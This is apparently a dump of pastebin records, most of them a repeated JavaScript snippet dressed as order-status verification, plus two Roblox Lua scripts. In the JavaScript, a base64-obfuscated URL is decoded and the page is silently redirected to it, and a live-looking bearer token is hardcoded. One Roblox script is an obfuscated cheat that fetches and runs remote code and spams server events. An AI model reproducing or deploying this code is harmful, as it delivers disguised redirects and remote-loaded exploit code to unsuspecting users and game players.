          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BaKmGbN8,Hold E to Teleport,OnFireRobloxScriptin,Lua,Saturday 22nd of March 2025 11:00:34 PM CDT,"--//Variables
local prox = script.Parent.ProximityPrompt --Variable for the proximity prompt
local teleportLocation = workspace.TeleportLocation --Variable for your teleport location part

prox.Triggered:Connect(function(player) --When the proximity prompt is triggered
	local character = player.Character --Variable for the player's character
	character:PivotTo(teleportLocation.CFrame + Vector3.new(0, 10, 0)) --Teleport character to new location
end)"
azXA9hkx,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:56:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/005/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7sVjmGuy,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:51:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9pjv8J33,viltrum,LSJiqueue,Lua,Saturday 22nd of March 2025 10:49:15 PM CDT,"local k = loadstring(game:HttpGet('https://sirius.menu/rayfield'))(); local o = game:GetService(""\80\108\97\121\101\114\115"").LocalPlayer;  local j = false; local t = false; local c = false;  local b = false;  local p = 0; local h = game:GetService(""\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101""); local e = k:CreateWindow({ Name = ""\86\105\108\116\114\117\109\32\66\97\116\116\108\101\103\114\111\117\110\100\115"", Icon = 0,  LoadingTitle = ""\86\105\108\116\114\117\109\32\66\97\116\116\108\101\103\114\111\117\110\100\115"", LoadingSubtitle = ""\98\121\32\48\105\120"", Theme = ""\68\101\102\97\117\108\116"",  DisableRayfieldPrompts = false, DisableBuildWarnings = false,  ConfigurationSaving = { Enabled = true, FolderName = nil,  FileName = ""\66\105\103\32\72\117\98"" }, KeySystem = true,  KeySettings = { Title = ""\86\105\108\116\114\117\109\32\66\97\116\116\108\101\103\114\111\117\110\100\115\58\32\48\105\120"", Subtitle = ""\75\101\121\32\83\121\115\116\101\109"", Note = ""\69\110\116\101\114\58\32\118\105\108\116\114\117\109\52\53\54"",  FileName = ""\75\101\121"",  SaveKey = true,  GrabKeyFromSite = false,  Key = {""\118\105\108\116\114\117\109\52\53\54""}  } }); local _ = e:CreateTab(""\77\97\105\110""); local l = e:CreateTab(""\80\108\97\121\101\114""); local a = e:CreateTab(""\84\114\111\108\108\105\110\103""); _:CreateToggle({ Name = ""\65\117\116\111\32\66\108\111\99\107"", CurrentValue = false,  Callback = function(s) j = s; print(j) if (j == true) then  while (j == true) do  task.wait();  local f = { [1] = true } game:GetService(""\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101""):WaitForChild(""\83\101\116\66\108\111\99\107\105\110\103""):FireServer(unpack(f));        end;  k:Notify({ Title = ""\65\117\116\111\32\66\108\111\99\107"", Content = ""\69\110\97\98\108\101\100\32\40\68\101\99\114\101\97\115\101\115\32\87\97\108\107\83\112\101\101\100\41"", Duration = 2 });  elseif (j == false) then  k:Notify({ Title = ""\65\117\116\111\32\66\108\111\99\107"", Content = ""\68\105\115\97\98\108\101\100"", Duration = 2 }); end;  end;  }); _:CreateToggle({ Name = ""\76\97\114\103\101\32\72\105\116\98\111\120\101\115"", CurrentValue = false, Callback = function(s)  b = s; if (b == true) then  k:Notify({ Title = ""\76\97\114\103\101\32\72\105\116\98\111\120\101\115"", Content = ""\69\110\97\98\108\101\100"", Duration = 2 }); task.spawn(function()  while (b == true) do  task.wait(); for j, s in game:GetService(""\87\111\114\107\115\112\97\99\101""):GetChildren() do  if (s:FindFirstChild(""\72\117\109\97\110\111\105\100"") and game:GetService(""\80\108\97\121\101\114\115""):FindFirstChild(s.Name) and s.Name ~= o.Name)  then  s.HumanoidRootPart.Size = Vector3.new(p, p, p); s.HumanoidRootPart.Transparency = 0.7; s.HumanoidRootPart.Color = Color3.fromRGB(33, 84, 185); end;  end;  end;  end); elseif (b == false) then  k:Notify({ Title = ""\76\97\114\103\101\32\72\105\116\98\111\120\101\115"", Content = ""\68\105\115\97\98\108\101\100"", Duration = 2 }); task.wait(1); for j, s in game:GetService(""\87\111\114\107\115\112\97\99\101""):GetChildren() do  if (s:FindFirstChild(""\72\117\109\97\110\111\105\100"") and game:GetService(""\80\108\97\121\101\114\115""):FindFirstChild(s.Name) and s.Name ~= o.Name)  then  print(s.Name); print(""\67\104\97\110\103\105\110\103\33""); s.HumanoidRootPart.Size = Vector3.new(2,2,1); s.HumanoidRootPart.Transparency = 1; s.HumanoidRootPart.Color = Color3.fromRGB(163, 162, 165); end;  end;  end; end;  }); _:CreateSlider({ Name = ""\72\105\116\98\111\120\32\83\105\122\101"", Range = {10, 20}, Increment = 1, Suffix = ""\83\105\122\101"", CurrentValue = 10, Callback = function(s)  p = s; end; }) a:CreateToggle({ Name = ""\67\114\97\116\101\114\32\83\112\97\109\109\101\114\32\40\75\101\121\98\105\110\100\58\32\69\44\32\70\117\110\41"", CurrentValue = false,  Callback = function(s)  t = s;  if (t == true) then  k:Notify({ Title = ""\67\114\97\116\101\114\32\83\112\97\109\109\101\114"", Content = ""\69\110\97\98\108\101\100"", Duration = 2 }); elseif (t == false) then  k:Notify({ Title = ""\67\114\97\116\101\114\32\83\112\97\109\109\101\114"", Content = ""\68\105\115\97\98\108\101\100"", Duration = 2 }); end;  end;  }) _:CreateButton({ Name = ""\70\108\121\32\87\105\116\104\32\65\110\121\32\67\104\97\114\97\99\116\101\114"", Callback = function(s)  game.Workspace:FindFirstChild(o.Name).SelectedCharacter.Value = ""\86\105\108\116\114\117\109\105\116\101"";  k:Notify({ Title = ""\70\108\121\32\87\105\116\104\32\65\110\121\32\67\104\97\114\97\99\116\101\114"", Content = ""\89\111\117\32\99\97\110\32\110\111\119\32\102\108\121\32\119\105\116\104\32\97\110\121\32\99\104\97\114\97\99\116\101\114\33"", Duration = 2 }); end;  }); _:CreateToggle({ Name = ""\65\110\116\105\32\82\97\103\100\111\108\108\32\40\75\105\110\100\97\41"", CurrentValue = false,  Callback = function(s)  c = s; if (c == true) then  while (c == true) do  task.wait();  game.Workspace:FindFirstChild(o.Name):FindFirstChild(""\82\97\103\100\111\108\108\84\114\105\103\103\101\114"").Value = false; end;  k:Notify({ Title = ""\65\110\116\105\32\82\97\103\100\111\108\108"", Content = ""\69\110\97\98\108\101\100"", Duration = 2 });  elseif (c == false) then  k:Notify({ Title = ""\65\110\116\105\32\82\97\103\100\111\108\108"", Content = ""\68\105\115\97\98\108\101\100"", Duration = 2 });  end;  end; }) a:CreateToggle({ Name = ""\83\111\110\105\99\32\66\111\111\109\32\83\112\97\109\109\101\114\32\40\70\117\110\41"", CurrentValue = false,  Callback = function(s)  sb = s;  if (sb == true) then  while (sb == true) do  task.wait(); game:GetService(""\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101""):WaitForChild(""\77\97\107\101\83\111\110\105\99\66\111\111\109""):FireServer() end;  k:Notify({ Title = ""\83\111\110\105\99\32\66\111\111\109\32\83\112\97\109\109\101\114"", Content = ""\69\110\97\98\108\101\100"", Duration = 2 });  elseif(sb == false) then  k:Notify({ Title = ""\83\111\110\105\99\32\66\111\111\109\32\83\112\97\109\109\101\114"", Content = ""\68\105\115\97\98\108\101\100"", Duration = 2 });  end; end;  });  l:CreateSlider({ Name = ""\87\97\108\107\83\112\101\101\100"", Range = {25, 100}, Increment = 1, Suffix = ""\83\112\101\101\100"", CurrentValue = 25, Callback = function(s) task.spawn(function()  while (task.wait()) do  game.Workspace:FindFirstChild(o.Name).Humanoid.WalkSpeed = s; end;  end); end, }) local g = e:CreateTab(""\72\111\119\32\84\111\32\85\115\101""); g:CreateLabel(""\70\101\97\116\117\114\101\115\58""); g:CreateParagraph({ Title = ""\65\117\116\111\32\66\108\111\99\107\58"", Content = ""\65\117\116\111\109\97\116\105\99\97\108\108\121\32\98\108\111\99\107\115\32\111\112\112\111\110\101\110\116\115\32\109\111\118\101\115\46\32\65\108\116\104\111\117\103\104\44\32\105\116\32\99\97\110\110\111\116\32\98\108\111\99\107\32\105\102\32\112\108\97\121\101\114\32\105\115\32\98\101\104\105\110\100\32\111\114\32\98\101\115\105\100\101\32\121\111\117\46\32\87\111\114\107\115\32\105\110\32\102\101\119\32\111\99\99\97\115\105\111\110\115\46"" }); g:CreateParagraph({ Title = ""\76\97\114\103\101\32\72\105\116\98\111\120\101\115"", Content = ""\77\97\107\101\115\32\97\108\108\32\112\108\97\121\101\114\115\32\104\105\116\98\111\120\101\115\32\105\110\99\114\101\97\115\101\32\40\98\97\115\101\100\32\111\110\32\104\111\119\32\108\97\114\103\101\32\121\111\117\32\115\101\116\32\105\116\32\118\105\97\32\104\105\116\98\111\120\32\115\105\122\101\41"" }); g:CreateParagraph({ Title = ""\70\108\121\32\87\105\116\104\32\65\110\121\32\67\104\97\114\97\99\116\101\114"", Content = ""\83\101\108\102\32\69\120\112\108\97\110\97\116\111\114\121\59\32\97\108\108\111\119\115\32\121\111\117\32\116\111\32\102\108\121\32\119\105\116\104\32\97\110\121\32\99\104\97\114\97\99\116\101\114"" }); g:CreateParagraph({ Title = ""\65\110\116\105\32\82\97\103\100\111\108\108"", Content = ""\83\101\108\102\32\69\120\112\108\97\110\97\116\111\114\121\59\32\103\105\118\101\115\32\121\111\117\32\97\32\115\111\109\101\119\104\97\116\32\101\120\112\101\114\105\101\110\99\101\32\111\102\32\97\110\116\105\45\114\97\103\100\111\108\108"" }); g:CreateParagraph({ Title = ""\87\97\108\107\83\112\101\101\100"", Content = ""\77\97\107\101\115\32\121\111\117\32\114\117\110\32\102\97\115\116\101\114\32\40\98\97\115\101\100\32\111\110\32\104\111\119\32\102\97\115\116\32\121\111\117\32\115\101\116\32\105\116\32\118\105\97\32\116\104\101\32\115\108\105\100\101\114\41"" }); g:CreateParagraph({ Title = ""\67\114\97\116\101\114\32\83\112\97\109\109\101\114"", Content = ""\87\104\101\110\32\121\111\117\32\112\114\101\115\115\32\116\104\101\32\107\101\121\98\105\110\100\44\32\99\114\101\97\116\101\115\32\97\32\98\105\103\32\99\114\97\116\101\114\32\117\110\100\101\114\110\101\97\116\104\32\121\111\117\46"" }); g:CreateParagraph({ Title = ""\83\111\110\105\99\32\66\111\111\109\32\83\112\97\109\109\101\114"", Content = ""\83\112\97\109\115\32\115\111\110\105\99\32\98\111\111\109\32\115\111\117\110\100\32\97\110\100\32\101\102\102\101\99\116\32\118\101\114\121\32\102\97\115\116"" }); local m = e:CreateTab(""\76\97\115\116\32\85\112\100\97\116\101\100""); m:CreateLabel(""\80\97\116\99\104\101\100\58\32\78\79""); m:CreateLabel(""\85\110\100\101\116\101\99\116\101\100\58\240\159\159\162""); m:CreateParagraph({ Title = ""\85\112\100\97\116\101\100\58"", Content = ""\51\47\50\50\47\50\53"" }); h.InputBegan:Connect(function(d, n) if (n) then return end;  if (d.UserInputType == Enum.UserInputType.MouseButton1 and j == true) then  local f = { [1] = false } game:GetService(""\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101""):WaitForChild(""\83\101\116\66\108\111\99\107\105\110\103""):FireServer(unpack(f));        end;  if (d.KeyCode == Enum.KeyCode.E and t == true) then  local f = { [1] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame - Vector3.new(0, -5, 0), [2] = math.huge } game:GetService(""\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101""):WaitForChild(""\73\109\112\97\99\116\72\105\116""):FireServer(unpack(f));            end;  end);"
Tmf0Exvv,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:45:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/063/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XSctM6JC,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:40:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/712/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JCkTcaBJ,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:35:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/904/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2kXq5XJU,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:18:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/033/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fY1tMfvL,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:12:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/749/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rqADYDT8,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 10:01:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/745/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6e7xbsgu,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 09:56:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/793/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
